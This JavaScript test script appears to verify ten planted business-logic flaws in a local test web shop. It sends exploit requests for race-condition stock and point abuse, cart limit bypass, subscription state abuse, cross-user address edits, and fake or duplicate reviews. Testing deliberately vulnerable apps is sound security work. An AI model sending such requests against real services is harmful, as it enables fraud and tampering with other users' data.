// test-vuln.js - Verification of 10 Business Logic Flaws for site033 (Port 9932)
const PORT = 9932;
const BASE_URL = `http://localhost:${PORT}`;

async function runTests() {
  console.log('🥬 Starting Business Logic Vulnerability Verification for TableLoop (Port 9932)...\n');
  let passed = 0;

  // 1. SEC-331: Concurrent race condition inventory deduction
  try {
    const payload = {
      items: [{ productId: 'prod-001', quantity: 1 }],
      usedPoints: 0,
      addressId: 'addr-001'
    };
    const [r1, r2] = await Promise.all([
      fetch(`${BASE_URL}/api/orders`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).then(r => r.json()),
      fetch(`${BASE_URL}/api/orders`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).then(r => r.json())
    ]);
    const prodRes = await fetch(`${BASE_URL}/api/products/prod-001`).then(r => r.json());
    if (r1.success && r2.success && prodRes.data.stock < 0) {
      console.log(`✅ [SEC-331] Inventory Concurrency Race Condition -> PASSED (Stock: ${prodRes.data.stock})`);
      passed++;
    } else {
      console.log(`❌ [SEC-331] FAILED`, { r1, r2, stock: prodRes.data.stock });
    }
  } catch (err) {
    console.log(`❌ [SEC-331] ERROR:`, err.message);
  }

  // 2. SEC-332: Cart quantity bypass
  try {
    const res = await fetch(`${BASE_URL}/api/cart/items/cart-001`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ quantity: 99 })
    }).then(r => r.json());
    if (res.success && res.data.quantity === 99) {
      console.log(`✅ [SEC-332] Cart Quantity Validation Bypass -> PASSED (Quantity: ${res.data.quantity})`);
      passed++;
    } else {
      console.log(`❌ [SEC-332] FAILED`, res);
    }
  } catch (err) {
    console.log(`❌ [SEC-332] ERROR:`, err.message);
  }

  // 3. SEC-333: Resume cancelled subscription
  try {
    const res = await fetch(`${BASE_URL}/api/subscriptions/sub-003/resume`, { method: 'POST' }).then(r => r.json());
    if (res.success && res.data.status === 'active') {
      console.log(`✅ [SEC-333] Subscription State Transition Missing -> PASSED (Status: ${res.data.status})`);
      passed++;
    } else {
      console.log(`❌ [SEC-333] FAILED`, res);
    }
  } catch (err) {
    console.log(`❌ [SEC-333] ERROR:`, err.message);
  }

  // 4. SEC-334: Shipment for cancelled subscription
  try {
    const res = await fetch(`${BASE_URL}/api/subscriptions/sub-005/shipments`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ scheduledDate: '2026-04-18' })
    }).then(r => r.json());
    if (res.success && res.data.subscriptionId === 'sub-005') {
      console.log(`✅ [SEC-334] Cancelled Subscription Shipment Creation -> PASSED (Shipment: ${res.data.id})`);
      passed++;
    } else {
      console.log(`❌ [SEC-334] FAILED`, res);
    }
  } catch (err) {
    console.log(`❌ [SEC-334] ERROR:`, err.message);
  }

  // 5. SEC-335: Point overdraft on order
  try {
    const res = await fetch(`${BASE_URL}/api/orders`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ items: [{ productId: 'prod-002', quantity: 1 }], usedPoints: 50000, addressId: 'addr-001' })
    }).then(r => r.json());
    const ptRes = await fetch(`${BASE_URL}/api/points/balance`).then(r => r.json());
    if (res.success && ptRes.data.points < 0) {
      console.log(`✅ [SEC-335] Point Balance Overdraft Error -> PASSED (User Points: ${ptRes.data.points})`);
      passed++;
    } else {
      console.log(`❌ [SEC-335] FAILED`, { res, pt: ptRes.data });
    }
  } catch (err) {
    console.log(`❌ [SEC-335] ERROR:`, err.message);
  }

  // 6. SEC-336: Duplicate point redemption
  try {
    const reqData = { amount: 1000, reason: 'Duplicate Test Coupon', redemptionId: 'dup-redem-101' };
    const [r1, r2] = await Promise.all([
      fetch(`${BASE_URL}/api/points/redeem`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(reqData) }).then(r => r.json()),
      fetch(`${BASE_URL}/api/points/redeem`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(reqData) }).then(r => r.json())
    ]);
    if (r1.success && r2.success && r1.data.id !== r2.data.id) {
      console.log(`✅ [SEC-336] Duplicate Point Redemption -> PASSED (2 Tx created: ${r1.data.id}, ${r2.data.id})`);
      passed++;
    } else {
      console.log(`❌ [SEC-336] FAILED`, { r1, r2 });
    }
  } catch (err) {
    console.log(`❌ [SEC-336] ERROR:`, err.message);
  }

  // 7. SEC-337: Address ownership validation missing
  try {
    const res = await fetch(`${BASE_URL}/api/addresses/addr-003`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ detailAddress: 'Cross-User Modified Address' })
    }).then(r => r.json());
    if (res.success && res.data.detailAddress === 'Cross-User Modified Address') {
      console.log(`✅ [SEC-337] Address Ownership Missing -> PASSED (Target: addr-003 modified)`);
      passed++;
    } else {
      console.log(`❌ [SEC-337] FAILED`, res);
    }
  } catch (err) {
    console.log(`❌ [SEC-337] ERROR:`, err.message);
  }

  // 8. SEC-338: Multiple default address assignment
  try {
    const res = await fetch(`${BASE_URL}/api/addresses/addr-002/set-default`, { method: 'POST' }).then(r => r.json());
    const addrs = await fetch(`${BASE_URL}/api/addresses`).then(r => r.json());
    const defaultCount = addrs.data.filter(a => a.isDefault).length;
    if (res.success && defaultCount > 1) {
      console.log(`✅ [SEC-338] Multiple Default Address Assignment -> PASSED (Default addresses: ${defaultCount})`);
      passed++;
    } else {
      console.log(`❌ [SEC-338] FAILED`, { res, defaultCount });
    }
  } catch (err) {
    console.log(`❌ [SEC-338] ERROR:`, err.message);
  }

  // 9. SEC-339: Unpurchased product review
  try {
    const res = await fetch(`${BASE_URL}/api/products/prod-009/reviews`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ rating: 5, content: '미구매 유저의 솔직 리뷰' })
    }).then(r => r.json());
    if (res.success && res.data.productId === 'prod-009') {
      console.log(`✅ [SEC-339] Unpurchased Product Review Creation -> PASSED (Review: ${res.data.id})`);
      passed++;
    } else {
      console.log(`❌ [SEC-339] FAILED`, res);
    }
  } catch (err) {
    console.log(`❌ [SEC-339] ERROR:`, err.message);
  }

  // 10. SEC-340: Duplicate review limit bypass
  try {
    const [r1, r2] = await Promise.all([
      fetch(`${BASE_URL}/api/products/prod-004/reviews`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ orderId: 'ord-1003', rating: 5, content: '리뷰 1' }) }).then(r => r.json()),
      fetch(`${BASE_URL}/api/products/prod-004/reviews`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ orderId: 'ord-1003', rating: 4, content: '리뷰 2' }) }).then(r => r.json())
    ]);
    if (r1.success && r2.success && r1.data.id !== r2.data.id) {
      console.log(`✅ [SEC-340] Duplicate Review Limit Bypass -> PASSED (2 Reviews created: ${r1.data.id}, ${r2.data.id})`);
      passed++;
    } else {
      console.log(`❌ [SEC-340] FAILED`, { r1, r2 });
    }
  } catch (err) {
    console.log(`❌ [SEC-340] ERROR:`, err.message);
  }

  console.log(`\n========================================`);
  console.log(`🎉 Test Results: ${passed} / 10 vulnerabilities verified!`);
  console.log(`========================================\n`);
}

runTests();
